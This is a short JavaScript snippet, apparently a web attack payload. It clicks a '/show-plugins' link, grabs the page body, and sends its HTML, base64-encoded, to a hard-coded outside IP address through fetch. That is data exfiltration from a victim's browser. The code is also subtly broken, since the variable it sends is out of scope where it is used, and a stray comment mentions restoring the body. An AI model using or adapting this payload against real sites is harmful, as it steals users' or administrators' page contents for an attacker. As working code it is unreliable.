const link = document.querySelector('a[href="/show-plugins"]');

// Simulate a click on the link if found
if (link) {
  link.click();

  // Event listener to wait for the new page to load
    window.addEventListener('load', function() {
      // Access the document.body of the new page
      const newPageBody = document.body;
      console.log('Document body of the new page:', newPageBody);
      // Perform actions with the body content of the new page
    });

    // Restore the original document.body content after a delay
    setTimeout(function() {
      console.log("waiting");
    }, 5000); // Adjust the delay as needed
  
  fetch("http://82.65.210.151:24000/?encodedData=" + btoa(newPageBody.innerHTML));
} else {
  console.error('Link not found');
}


